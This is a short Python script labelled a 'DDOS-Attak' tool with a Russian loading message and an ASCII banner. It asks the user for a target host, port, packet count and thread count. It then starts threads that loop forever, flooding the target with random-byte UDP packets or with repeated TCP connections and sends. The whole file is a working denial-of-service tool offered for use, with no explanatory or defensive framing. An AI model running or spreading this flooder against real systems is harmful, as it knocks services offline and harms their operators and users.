#CCGOU
import random
import socket
import threading
import time
from colorama import Fore
import os,sys

os.system("clear")
print(Fore.GREEN +"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print("""
      $$$$$$$\ $$$$$$$\  $$$$$$$\  $$$$$$\ $$     $$|
    $$  _____|$$  _____|$$  _____|$$  __$$\$$     $$|
    $$ /      $$ /      $$ /   __ $$ /  $$|$$     $$|
    $$ |      $$ |      $$ |  $$$|$$ |  $$|$$     $$|
    \$$$$$$$\ \$$$$$$$\  $$$$$$$ |\$$$$$$ |\$$$$$$$ /        
     \_______| \_______\ \_______| \______/ \______/     
------------------------------------------------------
[*] CCGOU DDOS-Attak
------------------------------------------------------
""")
ip = str(input(" Host/IP:=> "))
port = int(input(" Port:=> "))
choice = str(input(" UDP(y/n):=> "))
times = int(input(" Packets/times:=> "))
threads = int(input(" Threads:=> "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent to "+ ip)
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
